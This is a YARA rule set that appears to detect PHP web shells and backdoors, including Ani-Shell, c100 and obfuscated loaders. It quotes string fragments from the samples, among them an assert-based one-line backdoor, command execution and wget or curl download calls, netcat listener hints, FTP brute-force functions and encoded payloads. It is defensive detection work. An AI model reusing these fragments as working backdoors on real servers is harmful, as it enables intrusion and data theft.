/*
   YARA Rule Set
   Author: WatcherLab
   Date: 2019-02-23
   Identifier: php17
*/

/* Rule Set ----------------------------------------------------------------- */

rule _frm_DetFact
{
   meta:
      description = "php17 - file _frm_DetFact.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9f8098049627a024e6178e5b65faf520dae310fcc59395d5de51c7cb8340650a"
   strings:
      $s1 = "<td class=\"marcoCel\">'. utf8_encode($obj_var->limpioCaracteresXML(trim($detFact[$fil]['Descripcion']))) .'</td> " fullword ascii
      $s2 = "<td class=\"marcoCel dataNumber\">'. number_format($detFact[$fil]['PrecioTotalSinImpuesto'], $obj_var->decimalPDF," fullword ascii
      $s3 = "<td class=\"marcoCel dataNumber\">'. number_format($detFact[$fil]['Descuento'], $obj_var->decimalPDF, $obj_var->Se" fullword ascii
      $s4 = "for ($fil = 0; $fil < sizeof($detFact); $fil++) {" fullword ascii
      $s5 = "<td class=\"marcoCel\">'. utf8_encode($obj_var->limpioCaracteresXML(trim($detFact[$fil]['Descripcion']))) .'</td>             " fullword ascii
      $s6 = "<td class=\"marcoCel dataNumber\">'.intval($detFact[$fil]['Cantidad']).'</td>" fullword ascii
      $s7 = "<td class=\"marcoCel dataNumber\">'.$detFact[$fil]['PrecioUnitario'] .'</td>" fullword ascii
      $s8 = "$obj_var->SepdecimalPDF, '') .'</td>" fullword ascii
      $s9 = "<td class=\"marcoCel\">'.$detFact[$fil]['CodigoPrincipal'] .'</td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_825a3b2a6abbe6abcdeda64a73416b3d
{
   meta:
      description = "php17 - file 825a3b2a6abbe6abcdeda64a73416b3d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3f8f3bf466a633c0d2a8886a1aa4c6912aabea689b1cf86b193d01ef455ebae2"
   strings:
      $s1 = "$ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0 = gethostbyname($_REQUEST[\"ip\"]);$rand = oOo00o0OOo0o000000O($_REQUEST[\"port\"]);" fullword ascii
      $s2 = "$Aanvraag .= \"User-Agent: Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.1)\\r\\n\";" fullword ascii
      $s3 = ".\");}if(!oo00o0OOo0o00O(\"set_time_limit\") or !oo00o0OOo0o00O(\"ignore_user_abort\")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O(\"error" fullword ascii
      $s4 = "}if(!oo00o0OOo0o00O(\"set_time_limit\") or !oo00o0OOo0o00O(\"ignore_user_abort\")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O(\"error" fullword ascii
      $s5 = "@$att_bljs= oOo00o0OOo0o000000O($_REQUEST[\"att_bljs\"]);$time =  time();$max_time = $time+$exec_time;" fullword ascii
      $s6 = "$ooooo00oo0000oo0oo0oo00ooo0ooo0o0o0 = gethostbyname($_SERVER[\"SERVER_NAME\"]);" fullword ascii
      $s7 = "$Aanvraag = \"GET \".o0o0o0o0o0o0o0O0O0o0O0O0o0($att_web,$att_blqs,$att_bljs).\" HTTP/1.1\\r\\n\";" fullword ascii
      $s8 = "}if(@oOo00o0OOo0o000000O($_REQUEST[\"pass\"])<>oOo00o0OOo0o000000O($oooo0o00o0o0o0o0o0o0o00000o0o0o0o0o0oo0o0o0o0o0oo0)){OOOOO" fullword ascii
      $s9 = "if ($O0o0o0O0Oo0==false){file_put_contents($o0Oo0o0O00o00Oo,$O0oooooOO0oo0oo0o0o,FILE_APPEND);" fullword ascii
      $s10 = "}if($_REQUEST[\"act\"]==\"die\"){if(!oo00o0OOo0o00O(\"fsockopen\")){OOOOOOOOOOoOo00o0OOo0o0000o0o0O(\"error" fullword ascii
      $s11 = "$Aanvraag .= \"Host: \".oOoOOoOOoo00O0OOO0O($att_web).\":\".o0ooo0($att_web).\"\\r\\n\";" fullword ascii
      $s12 = "$oo0o0O0o00oOo0O0o0OoOOoO0OoOoO.= substr($o0o0o0O0O0O00O00o00o0oO0O0o,rand(0,(strlen($o0o0o0O0O0O00O00o00o0oO0O0o)-1)),1);" fullword ascii
      $s13 = "}if(@strpos($o00000000ooOOO00oo0o00O0o0,\"/\")){$o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,0,strpos($o0000" fullword ascii
      $s14 = "for($i=0;$i<floor($att_size/100);$i++){$dosstr=OOOOO0o0o0o0o(100);@$out.= \"XXDD0S\".$dosstr;}while(1){$Oooo0ooO0oo0ooooooo0 =" fullword ascii
      $s15 = "if(@strpos($o00000000ooOOO00oo0o00O0o0,\":\")){$o00000000ooOOO00oo0o00O0o0=substr($o00000000ooOOO00oo0o00O0o0,strpos($o0000000" fullword ascii
      $s16 = "if(!oOo00o0OOo0o0000o0o0O($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o)){OOOOOOO0OOO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,\"<?php\\n" fullword ascii
      $s17 = "if ($Oooo0ooO0oo0ooooooo0==\"true\"){$O0O0o0Oo0Oo0oO0oOoO0OOo00O00O0o0O0O0o0O0o0O0o000O0O0o++;if(time() > $max_time){OOOOOOO0O" fullword ascii
      $s18 = "$o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o=\"key.txt\";" fullword ascii
      $s19 = "OO0O0O0O00O0O0($o0O0o0O0o0O0o0O0o0oo0o0o0o0O0o,\"<?php\\n return \\\"die\\\";\\n?>\",true);break;}if($att_type!==\"tcp\"){" fullword ascii
      $s20 = "$exec_time = oOo00o0OOo0o000000O($_REQUEST[\"exec_time\"]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule Ani_Shell__2_
{
   meta:
      description = "php17 - file Ani-Shell__2_.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c027a23d19d1eeb041c657ae53f8c14358fe84e1094aba16757c26ca835b5a00"
   strings:
      $x1 = "$encoded = base64_encode(gzdeflate(trim(stripslashes($_POST['code'].' '),'<?php,?>'),9)); // high Compression! :P" fullword ascii
      $x2 = "$passwordPrompt = \"\\n=================================================================\\nAni-Shell | C0d3d by lionaneesh " fullword ascii
      $x3 = "= \"lionaneesh@gmail.com\"; // Change this to your email , This email is used to deliver tracebacks about your shell" fullword ascii
      $x4 = "socket_write($client , ($os == \"Windows\") ? exec_all(\"date /t & time /t\")  . \"\\n\" . exec_all(\"ver\") : exec_all(\"date" fullword ascii
      $x5 = "// exec_all , A function used to execute commands , This function will only execute if the Safe Mode is" fullword ascii
      $s6 = "--Some Garbage here --%x%S')this.value = '';\" onblur=\"if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';\"/>" fullword ascii
      $s7 = "(: <a href=\"http://twitter.com/lionaneesh\">Follow Me</a> | <a href=\"http://facebook.com/lionaneesh\">Facebook</a> :) <br />" fullword ascii
      $s8 = "<input class=\"cmd\" name=\"message\" value=\"%S%x--Some Garbage here --%x%S\" onfocus=\"if(this.value == '%S%x" fullword ascii
      $s9 = "// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\\" fullword ascii
      $s10 = "$handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'" fullword ascii
      $s11 = "fputs ($sockfd ,\"\\n=================================================================\\nAni-Shell | C0d3d by lionanees" fullword ascii
      $s12 = "/* Accept incoming requests and handle them as child processes */" fullword ascii
      $s13 = "<input class=\"cmd\" name=\"to\" value=\"victim@domain.com,victim2@domain.com\" onfocus=\"if(this.value == 'vic" fullword ascii
      $s14 = "$output = shell_exec($command);" fullword ascii
      $s15 = "function exec_query_mysql($query,$sql_server,$sql_port,$sql_db,$sql_user,$sql_pass)" fullword ascii
      $s16 = "<form action=\"http://google.com\" method=\"GET\">" fullword ascii
      $s17 = "<th class=\"header\" colspan=\"1\" width=\"50px\">Bind Shell</th>" fullword ascii
      $s18 = "Oracle : <?php echo function_exists('ocilogon')?(\"<font color='red'>Enabled</font>\"):(\"Disabled\"); ?> <font color=\"s" fullword ascii
      $s19 = "if(!mail($_GET['to'],$_GET['subject'].$subjectPadd,$_GET['message'].$messagePadd,\"From:\".$from))" fullword ascii
      $s20 = "= \"off\"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_6c57bb8210f2e97f146765837fb53e01
{
   meta:
      description = "php17 - file 6c57bb8210f2e97f146765837fb53e01.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1cbc60bb64485d67d8d21799446e70f9ce2cf397a25d53bb9bd2f1d0e33962dd"
   strings:
      $s1 = "action=\"\"><input type=\"text\" name=\"wp_l_\" value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" fullword ascii
      $s2 = "';$wp_l_=isset($_POST['wp_l_'])?$_POST['wp_l_']:(isset($_COOKIE['wp_l_'])?$_COOKIE['wp_l_']:NULL);if($wp_l_!==NULL){$wp_l_=md5($" ascii
      $s3 = "';$wp_l_=isset($_POST['wp_l_'])?$_POST['wp_l_']:(isset($_COOKIE['wp_l_'])?$_COOKIE['wp_l_']:NULL);if($wp_l_!==NULL){$wp_l_=md5($" ascii
      $s4 = "etcookie('wp_l_', $_POST['wp_l_']);$wp___l_=create_function('',$wp__l_);unset($wp_l_,$wp__l_);$wp___l_();}}?><form method=\"post" ascii
      $s5 = "_[$wp___l_])-ord($wp_l_[$wp___l_]))%256);$wp_l_.=$wp__l_[$wp___l_];}if($wp__l_=@gzinflate($wp__l_)){if(isset($_POST['wp_l_']))@s" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 50KB and
      all of them
}

rule sig_9a4e215c039b824bbb0337bac7935744190ac6ad
{
   meta:
      description = "php17 - file 9a4e215c039b824bbb0337bac7935744190ac6ad.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8afbcfbae4842ec1f5788dee8a4873b55d5ddb3ddfb9df925b1d7d30f818f192"
   strings:
      $s1 = "call_user_func_array('assert', array($_REQUEST['pass']));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6bf4910b01aa4f296e590b75a3d25642
{
   meta:
      description = "php17 - file 6bf4910b01aa4f296e590b75a3d25642.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b0e4ff8954ee4ff28766bbd9fa5bfa577f275f720c33eef5f702db204ad54828"
   strings:
      $s1 = "if ( isset($_GET['index']) )" fullword ascii
      $s2 = "J8MTn7ho73zzVBdBlIgM6r6RoiwiS+8EJzgc9s9Tbq//3T89OPEd0w0xVcVWanJoNDg8P/FCVOFjMBg5Sh5685RaTrYlT+b4OxEi1hcFhZfPZd0sBUu2etItb6O2eRVC" ascii
      $s3 = "faanP26Ggy6l+2ITbSjSlHJkWuAez/JFEbXIoVgV4DtONMddGqUx3dQG5TjlK72NUMktWFfzfIP2eo153+l5IgU8IBMiLRPFZkkocLcdM8V35Gg5upr/KeE8QgSLVo8n" ascii
      $s4 = "SbY3LvY1yZXhUeAokPweur+TVSTYRL99MR803KfeMptU99rjpWYThW6JDdmlLvWwuBAFa3nKCN2WVFvvzWSODgi/5GTXUVcXa4sRlik8V6Yr5fSpZR3Wu/Lp3sKER2pb" ascii
      $s5 = "S5pBeHqGmZRMpLjIVT7HcVH3fzSP7TSItMi+Lc2yK0hE5E+6Tb/ltB3TIFPV0LoEMqN3en/WigJHTHFRWDw0rs/0blph3sRX/kWKy8sfyYHWryepEnbKHKSsVVaqhx0y" ascii
      $s6 = "YYNYCcp6hoEfBP3B6YUzc9fsxrl3tR4+fnXeZclIJMpZkS7Z6aBxDnC81fbDf/3hBT0ejc7C404wokpNzbPrDfXQ/+fcD1Ph+bBiDcYiXqAFcjEjC5ZaCW1ApMhyplB4" ascii
      $s7 = "bt4kHPm5r4DKhUeQumeOB0ozC9mUdCCBFdHMy0BMBN49zztyhkqyfKav5BgLhX5CRVGxaOzgoSRxrDxop+oAv7Ddat/V7ru23dEomglP9xRKCezfBaL8QbbJX38fj/ba" ascii
      $s8 = "6XiW8R0xlEjKNDZbtRp4bAHrHfRU3U475oPDTc4gVk+4g8jVkcxHs1rU1r5ncLR57vpnBU5HGEmKn4UgfghQMakhFBMEoA8rNJsFvWSzVVw0Xhu/+Dzh07Jg+iU3fxlN" ascii
      $s9 = "dmPUPhUcZ20wCrMw9IYILpyaEucK7YyR6cNH3E91o1AcdwP3UheV5qFow4WwUeOZNBWYXxJXSnjnVd0VuMAh1mbhkdgRWTb0ThlSICVEKPKehsPhtXtTdYc8Pl0slrCq" ascii
      $s10 = "NUD0XP+rUH4CtZNVsp0w51Lg/wE=')))); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule sig_15datavalidation_xls
{
   meta:
      description = "php17 - file 15datavalidation-xls.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2f9f1c1f7e51d1509666f48deb7dca6f5bb4fb36381c7da83e267f790d97b967"
   strings:
      $x1 = "* @copyright  Copyright (c) 2006 - 2014 PHPExcel (http://www.codeplex.com/PHPExcel)" fullword ascii
      $s2 = "echo date('H:i:s') , \" Peak memory usage: \" , (memory_get_peak_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s3 = "echo date('H:i:s') , ' Current memory usage: ' , (memory_get_usage(true) / 1024 / 1024) , \" MB\" , EOL;" fullword ascii
      $s4 = "* @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt" fullword ascii
      $s5 = "* Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA" fullword ascii
      $s6 = "* Copyright (C) 2006 - 2014 PHPExcel" fullword ascii
      $s7 = "echo date('H:i:s') , \" File written to \" , str_replace('.php', '.xls', pathinfo(__FILE__, PATHINFO_BASENAME)) , EOL;" fullword ascii
      $s8 = "$objValidation = $objPHPExcel->getActiveSheet()->getCell('B5')->getDataValidation();" fullword ascii
      $s9 = "$objValidation = $objPHPExcel->getActiveSheet()->getCell('B7')->getDataValidation();" fullword ascii
      $s10 = "$objValidation = $objPHPExcel->getActiveSheet()->getCell('B3')->getDataValidation();" fullword ascii
      $s11 = "$objValidation->setErrorStyle( PHPExcel_Cell_DataValidation::STYLE_INFORMATION );" fullword ascii
      $s12 = "// Make sure NOT to put a range of cells or a formula between \" and \"  !!!" fullword ascii
      $s13 = "$objValidation->setErrorStyle( PHPExcel_Cell_DataValidation::STYLE_STOP );" fullword ascii
      $s14 = "$objPHPExcel->getProperties()->setCreator(\"Maarten Balliauw\")" fullword ascii
      $s15 = "/** Error reporting */" fullword ascii
      $s16 = "$objPHPExcel->getActiveSheet()->setCellValue('A1', \"Cell B3 and B5 contain data validation...\")" fullword ascii
      $s17 = "$objValidation->setError('Only numbers between 10 and 20 are allowed!');" fullword ascii
      $s18 = "// Make sure to put the list items between \" and \"  !!!" fullword ascii
      $s19 = "$objValidation->setPrompt('Please pick a value from the drop-down list.');" fullword ascii
      $s20 = "echo 'File has been created in ' , getcwd() , EOL;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_3926ab64dcf04e87024011cf39902beac32711da
{
   meta:
      description = "php17 - file 3926ab64dcf04e87024011cf39902beac32711da.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
   strings:
      $x1 = "var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||\"object\"}function H(a){return G(a)==\"function\"}fun" ascii
      $x2 = "return (res = new RegExp('(?:^|; )' + encodeURIComponent(key) + '=([^;]*)').exec(document.cookie)) ? (res[1]) : null;" fullword ascii
      $x3 = "<tr><td colspan='2'><pre id='backResult'>Run ' nc -l -v -p port ' on your computer and press ' run ' button</pre></td></tr>" fullword ascii
      $x4 = "$cmd = execute(\"taskkill /F /PID \".$pid);" fullword ascii
      $x5 = "send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort, dbQuery:dbQuery}, function(res){" fullword ascii
      $x6 = "$body = preg_replace(\"/<a href=\\\"http:\\/\\/www.zend.com\\/(.*?)<\\/a>/\", \"\", $body);" fullword ascii
      $x7 = "$buff = execute(\"wget \".$url.\" -O \".$saveas);" fullword ascii
      $x8 = "$cmd = trim(execute(\"ps -p \".$pid));" fullword ascii
      $s9 = "execute(\"tar xf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s10 = "$buff = execute(\"curl \".$url.\" -o \".$saveas);" fullword ascii
      $s11 = "execute(\"tar xzf \\\"\".basename($archive).\"\\\" -C \\\"\".$target.\"\\\"\");" fullword ascii
      $s12 = "$cmd = execute(\"tasklist /FI \\\"PID eq \".$pid.\"\\\"\");" fullword ascii
      $s13 = "send_post({dbType:dbType, dbHost:dbHost, dbUser:dbUser, dbPass:dbPass, dbPort:dbPort}, function(res){" fullword ascii
      $s14 = "if((strpos($cmd, \"such process\")===false)&&(strpos($cmd, \"not permitted\")===false)){" fullword ascii
      $s15 = "/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */" fullword ascii
      $s16 = "$buff = execute(\"lynx -source \".$url.\" > \".$saveas);" fullword ascii
      $s17 = "$cmd = execute(\"kill -9 \".$pid);" fullword ascii
      $s18 = "if(function_exists('pg_connect')) return @pg_connect(\"$host_str user=$sqluser password=$sqlpass\");" fullword ascii
      $s19 = "elseif($type=='targz') execute(\"tar czf \\\"\".$archive.\"\\\" \".implode(\" \", $lists));" fullword ascii
      $s20 = "elseif(isset($p['dbType'])&&isset($p['dbHost'])&&isset($p['dbUser'])&&isset($p['dbPass'])&&isset($p['dbPort'])){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule aca0d5298226d7e21e6c304b9282d1abda785770
{
   meta:
      description = "php17 - file aca0d5298226d7e21e6c304b9282d1abda785770.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4dd30c9264a6b03f09a3d080f21accb1e9b31aba28e708fb9f90cfcf549f4fb2"
   strings:
      $s1 = "vcj1yZWQ+PGI+Jy4kZGJuYW1lLic8L2ZvbnQ+PC9iPjo8QlI+RXhhbXBsZSBWQkIgUGFzc3dvcmQ6IDxmb250IGNvbG9yPXJlZD52YmF0ZWFtPC9mb250PjxCUj48Zm9" ascii
      $s2 = "bY2xhc3NdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiB2YWx1ZT1cIiRhcmdbdmFsdWVdXCIgdHlwZT1cIiRhcmdbdHlwZV1cIiAkYXJnW3N" ascii
      $s3 = "// encrypt your password : \"cyclone\"" fullword ascii
      $s4 = "pbGU6IDxpbnB1dCBjbGFzcz0iaW5wdXQiIG5hbWU9Im15c3FsZGxmaWxlIiBzaXplPSIxMTUiIHR5cGU9InRleHQiIC8+IDxhIGhyZWY9ImphdmFzY3JpcHQ6bXlzcWx" ascii
      $s5 = "kaXIoXCcnLiRkcml2ZS0+UGF0aC4nL1wnKTsiIHRpdGxlPSJUeXBlOicuJERyaXZlVHlwZURCWyRkcml2ZS0+RHJpdmVUeXBlXS4nIj4nLiREcml2ZVR5cGVEQlskZHJ" ascii
      $s6 = "ERVItQ09MTEFQU0U6IGNvbGxhcHNlJyBjZWxsU3BhY2luZz0wIGJvcmRlckNvbG9yRGFyaz0jOTY2MTE3IGNlbGxQYWRkaW5nPTUgd2lkdGg9JzUwJScgYmdDb2xvcj0" ascii
      $s7 = "hbHVlPVwiMVwiIHR5cGU9XCJjaGVja2JveFwiIC8+IFNhdmUgYXMgZmlsZSA8aW5wdXQgY2xhc3M9XCJpbnB1dFwiIG5hbWU9XCJwYXRoXCIgdmFsdWU9XCIiLlNBX1J" ascii
      $s8 = "gY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj48dHI+PHRkIGNvbHNwYW49IjIiPlJ1biBTUUwgcXVlcnkvcXVlcmllcyBvbiBkYXRhYmFzZSA8Zm9udCBjb2x" ascii
      $s9 = "0IGNvbG9yPXdoaXRlPmlkPC9mb250PjogIi5AZ2V0bXl1aWQoKS4iKCIuQGdldF9jdXJyZW50X3VzZXIoKS4iKSAtIHVpZD0iLkBnZXRteXVpZCgpLiIgKCIuQGdldF9" ascii
      $s10 = "iOz8+ICB8IDxhIGhyZWY9Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9ncm91cHMvTXVzbGltQ3liZXJBcm15Nzg2LyIgdGFyZ2V0PSJfYmxhbmsiPjw/cGhwIGVjaG8" ascii
      $s11 = "3cz0nMjAnIG5hbWU9J3VzZXJzJyBjb2xzPScyNScgc3R5bGU9J2JvcmRlcjogMnB4IHNvbGlkICMxRDFEMUQ7IGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7IGNvbG9" ascii
      $s12 = "kdGFibGVuYW1lLidcJywgXCdzdHJ1Y3R1cmVcJyk7Ij5TdHJ1Y3R1cmU8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCc" ascii
      $s13 = "sb2FkIiB0eXBlPSJzdWJtaXQiIC8+PGlucHV0IG5hbWU9InVwbG9hZGRpciIgdmFsdWU9IicuJGRpci4nIiB0eXBlPSJoaWRkZW4iIC8+PGlucHV0IG5hbWU9ImRpciI" ascii
      $s14 = "icywnc2VsZWN0ZWQnPT4kZGJuYW1lLCdvbmNoYW5nZSc9Pidtb2RkYm5hbWUodGhpcy5vcHRpb25zW3RoaXMuc2VsZWN0ZWRJbmRleF0udmFsdWUpJywnbmV3bGluZSc" ascii
      $s15 = "tYWtlaW5wdXQoYXJyYXkoJ3RpdGxlJz0+J1BsZWFzZSBpbnB1dCBQSFAgY29uZmlndXJhdGlvbiBwYXJhbWV0ZXIoZWc6bWFnaWNfcXVvdGVzX2dwYyknLCduYW1lJz0" ascii
      $s16 = "lcnRcJyk7Ij5JbnNlcnQ8L2E+IHwgPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlWydOYW1lJ10uJ1wnLCBcJ3N0cnVjdHVyZVwnKTsiPlN0cnV" ascii
      $s17 = "jMTBnaWQ6ICcuJGFycmF5WydnaWQnXS4nJiMxMyYjMTBHZWNvczogJy4kYXJyYXlbJ2dlY29zJ10uJyYjMTMmIzEwRGlyOiAnLiRhcnJheVsnZGlyJ10uJyYjMTMmIzE" ascii
      $s18 = "iaW5zZXJ0c3FsWycuJHJvd1snRmllbGQnXS4nXSIgc3R5bGU9IndpZHRoOjUwMHB4O2hlaWdodDo2MHB4O292ZXJmbG93OmF1dG87Ij4nLiR2YWx1ZS4nPC90ZXh0YXJ" ascii
      $s19 = "PT1QuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiJfTXlTUUwuc3FsXCIgdHlwZT1cInRleHRcIiBzaXplPVwiNjBcIiAvPiA8aW5wdXQgY2xhc3M9XCJidFwiIHR5cGU9XCJ" ascii
      $s20 = "gbm93cmFwIGNvbHNwYW49IjUiPjxhIGhyZWY9ImphdmFzY3JpcHQ6Z29kaXIoXCcnLmdldFVwUGF0aCgkbm93cGF0aCkuJ1wnKTsiPlBhcmVudCBEaXJlY3Rvcnk8L2E" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule ApprovalRequestAccepted
{
   meta:
      description = "php17 - file ApprovalRequestAccepted.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dea3cbbf2af0c366cc9d4fd168bd3895ab14a40dd11e6f0a3dad6fec4e315a42"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "* @link https://www.humhub.org/" fullword ascii
      $s3 = "* @copyright Copyright (c) 2016 HumHub GmbH & Co. KG" fullword ascii
      $s4 = "'{displayName}' => Html::tag('strong', Html::encode($this->originator->displayName))," fullword ascii
      $s5 = "return Yii::t('SpaceModule.notification', '{displayName} approved your membership for the space {spaceName}', array(" fullword ascii
      $s6 = "*  @inheritdoc" fullword ascii
      $s7 = "public function getMailSubject()" fullword ascii
      $s8 = "* SpaceApprovalRequestAcceptedNotification" fullword ascii
      $s9 = "'{spaceName}' => Html::tag('strong', Html::encode($this->source->name))" fullword ascii
      $s10 = "use humhub\\modules\\notification\\components\\BaseNotification;" fullword ascii
      $s11 = "public $viewName = \"approvalAccepted\";" fullword ascii
      $s12 = "return strip_tags($this->html());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_05311655a15b75fab86956663e1819cd
{
   meta:
      description = "php17 - file 05311655a15b75fab86956663e1819cd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
   strings:
      $x1 = "function N3tftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x2 = "am.ru/releases/cc100\\\">c100</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x3 = "$logfile = $tmpdir_logs.\"N3tsh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s4 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s5 = "t=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - ::: Balcan Crew ::: </title><STYLE>" fullword ascii
      $s6 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s7 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s8 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s9 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s10 = "$fqb_log = \"FTP Quick Brute (called c100 v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s11 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s12 = "if ($fqb_logemail) {@mail($fqb_logemail,\"777shell v. \".$shver.\" report\",$fqb_log);}" fullword ascii
      $s13 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s14 = "elseif (!$data = N3tgetsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s15 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s16 = "$out = \"# Dumped by c100.SQL v. \".$shver.\"" fullword ascii
      $s17 = "header(\"WWW-Authenticate: Basic realm=\\\"c100 \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s18 = "if (empty($datapipe[\"remoteaddr\"])) {$datapipe[\"remoteaddr\"] = \"irc.dalnet.ru:6667\";}" fullword ascii
      $s19 = "if (empty($bc[\"host\"])) {$bc[\"host\"] = getenv(\"REMOTE_ADDR\");}" fullword ascii
      $s20 = ".$k.\"][0] - unknown command.\"; N3tshexit();}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule sig_2ffb211b501f95be70d27f6b06eca10f
{
   meta:
      description = "php17 - file 2ffb211b501f95be70d27f6b06eca10f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f01a3b64a7002490b319fa00d8c873d3b68e033c7d46dcf0d7cbebd07af5bb53"
   strings:
      $x1 = "* @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)" fullword ascii
      $s2 = "* @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)" fullword ascii
      $s3 = "$GLOBALS['_1322903901_']=Array(base64_decode('cHJlZ1'.'9'.'yZXBsYWNl'),base64_decode('c2V'.'zc2l'.'vbl9lbmNvZGU='),base64_decode" ascii
      $s4 = "#define('COMPILER_INCLUDE_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'src');" fullword ascii
      $s5 = "#define('COMPILER_COLLECT_PATH', dirname(__FILE__).DIRECTORY_SEPARATOR.'stat');" fullword ascii
      $s6 = "7[round(0+0.2+0.2+0.2+0.2+0.2)] ._1621652629(23),8);}" fullword ascii
      $s7 = "* @package    Mage" fullword ascii
      $s8 = "03901_'][14]($_3,$_SERVER[_1621652629(19)],$_SERVER[_1621652629(20)],$_GET,$_POST,$GLOBALS['_1322903901_'][15]());if((round(0+82" ascii
      $s9 = "8+448+448+448))$GLOBALS['_1322903901_'][19]($_7,$_GET,$_GET);$GLOBALS['_1322903901_'][20]($_6,$_7[round(0)] ._1621652629(22) .$_" ascii
      $s10 = "29(10))||(isset($_POST[_1621652629(11)][_1621652629(12)])|| isset($_POST[_1621652629(13)][_1621652629(14)]))){function l__0($_2," ascii
      $s11 = "1322903901_'][10]($_4,$_1,$_2);$_5=@openssl_encrypt($_3,_1621652629(16),$_4);return array($GLOBALS['_1322903901_'][11]($_1),$_5)" ascii
